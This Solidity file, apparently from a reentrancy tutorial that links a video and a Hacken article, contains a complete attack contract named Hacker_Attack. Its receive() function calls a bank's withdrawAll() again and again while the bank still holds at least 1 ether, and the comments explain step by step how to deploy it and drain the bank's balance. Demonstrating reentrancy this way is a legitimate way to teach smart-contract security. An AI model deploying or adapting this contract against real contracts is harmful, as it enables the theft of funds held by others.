 // SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

/*

https://www.youtube.com/watch?v=76So4jCysAQ

    Explain withdrawAll()
    => happens all the time, standard use-case functionality
    => sending all the money to the caller
    => transfer my money to another contract

    How to use it

    Deploy Bank
    Deposit money
    Show address of the smart-contract
    
    Deploy Attack with the deployed address of the Bank
    - Because Attack will call methods of that class
    Deposit money at least 1 ether, because you have to deposit initially money

    Call attack multiple times.

    See balance of Bank decreases
    See balance of Attack increases 

https://hacken.io/discover/reentrancy-attacks/#An_example_of_reentrancy_vulnerability_revealed_by_Hacken
*/

contract LogContracts{
    event LogOutput(string log);
}

interface IBank {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Hacker_Attack  is LogContracts{

    IBank public immutable bank;

    //deploy with the address of the victim
    //creating an interface objects to call specific methods
    constructor(IBank _bank) payable{
        bank = _bank;
        emit LogOutput("Created Bank interface");
    }

    function depositInitial() external payable{

    }
    
    receive() external payable {
        emit LogOutput("Hacker receive()");
        if (address(bank).balance >= 1 ether) {
            bank.withdrawAll();
        }
    }

    function attack() external payable {
        emit LogOutput("Hacker attack()");
        emit LogOutput("Hacker pretends to be nice");
        //Hacker pretends to be the bank because it created the interface
        emit LogOutput("Hacker sends an ether");
        bank.deposit{value: 1 ether}();
        emit LogOutput("Hacker withdraws it all");
        bank.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getDeployedAddress() external view returns(address){
        return address(this);
    }
}